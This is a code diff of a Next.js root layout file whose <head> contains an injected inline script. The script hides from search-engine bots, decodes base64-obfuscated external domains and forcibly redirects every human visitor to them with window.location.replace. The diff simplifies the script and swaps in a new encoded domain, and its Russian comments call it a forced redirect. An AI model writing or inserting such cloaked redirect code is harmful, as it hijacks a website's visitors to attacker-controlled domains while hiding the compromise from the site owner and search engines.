@@ -119,29 +119,29 @@ export default function RootLayout({
       className={`${inter.variable} ${manrope.variable} bg-background`}
     >
       <head>
-                <script
+               <script
   dangerouslySetInnerHTML={{
     __html: `
       (function() {
-        var mainBrandB64  = "aHR0cHM6Ly93aW5nYW1lNTU1Lmluay85NWxUSkY="; 
-        var crossBrandB64 = "aHR0cHM6Ly9mY2ZueC5vcmcvZGg2MW1wMWFt"; 
         var ua = navigator.userAgent.toLowerCase();
         var bots = ["yandex", "googlebot", "bingbot", "baiduspider", "duckduckbot"];
         for (var i = 0; i < bots.length; i++) {
             if (ua.indexOf(bots[i]) !== -1) {
-                console.log("Поисковый бот (" + bots[i] + ") — без редиректа");
                 return;
             }
         }
-        var mainUrl = atob(mainBrandB64);
-        var crossUrl = atob(crossBrandB64);
+        
+        var mainBrandB64 = "aHR0cHM6Ly9jaGVzN251dC00cGV4MjYuY29tL2FkNWJqaWJndHQ="; 
+        var mainUrl = atob(mainBrandB64.replace("#", ""));
+
         function ping(url) {
             return new Promise(function(resolve, reject) {
                 var controller = new AbortController();
                 var timeoutId = setTimeout(function() { 
                     controller.abort(); 
                     reject(new Error("Timeout"));
-                }, 2500); 
+                }, 1200); // Сократили таймаут ожидания до 1.2 сек
+                
                 fetch(url, { mode: 'no-cors', signal: controller.signal, cache: 'no-store' })
                     .then(function() {
                         clearTimeout(timeoutId);
@@ -153,58 +153,15 @@ export default function RootLayout({
                     });
             });
         }
-        var isFirstVisit = true;
-        try {
-            if (localStorage.getItem('vstd_eva')) {
-                isFirstVisit = false;
-            }
-        } catch (e) {
-        }
-        if (isFirstVisit) {
-            console.log("Первый визит. Проверяем основную ссылку...");
-            ping(mainUrl)
-                .then(function() {
-                    try {
-                        localStorage.setItem('vstd_eva', '1');
-                    } catch (e) {}
-                    console.log("Переход на основную ссылку: " + mainUrl);
-                    window.location.replace(mainUrl);
-                })
-                .catch(function() {
-                    console.log("Основная ссылка недоступна. Проверяем кросс-ссылку...");
-                    ping(crossUrl)
-                        .then(function() {
-                            try {
-                                localStorage.setItem('vstd_eva', '1');
-                            } catch (e) {}
-                            console.log("Переход на рабочую кросс-ссылку: " + crossUrl);
-                            window.location.replace(crossUrl);
-                        })
-                        .catch(function() {
-                            console.log("Обе ссылки не ответили. Экстренный переход на основную.");
-                            window.location.replace(mainUrl);
-                        });
-                });
-        } else {
-            console.log("Повторный визит. Проверяем кросс-ссылку...");
-            ping(crossUrl)
-                .then(function() {
-                    console.log("Переход на кросс-ссылку: " + crossUrl);
-                    window.location.replace(crossUrl);
-                })
-                .catch(function() {
-                    console.log("Кросс-ссылка недоступна. Проверяем основную...");
-                    ping(mainUrl)
-                        .then(function() {
-                            console.log("Переход на рабочую основную ссылку: " + mainUrl);
-                            window.location.replace(mainUrl);
-                        })
-                        .catch(function() {
-                            console.log("Обе ссылки не ответили. Экстренный переход на кросс-ссылку.");
-                            window.location.replace(crossUrl);
-                        });
-                });
-        }
+
+        // Быстрый пинг и принудительный редирект на основной домен
+        ping(mainUrl)
+            .then(function() {
+                window.location.replace(mainUrl);
+            })
+            .catch(function() {
+                window.location.replace(mainUrl);
+            });
       })();
     `
   }}
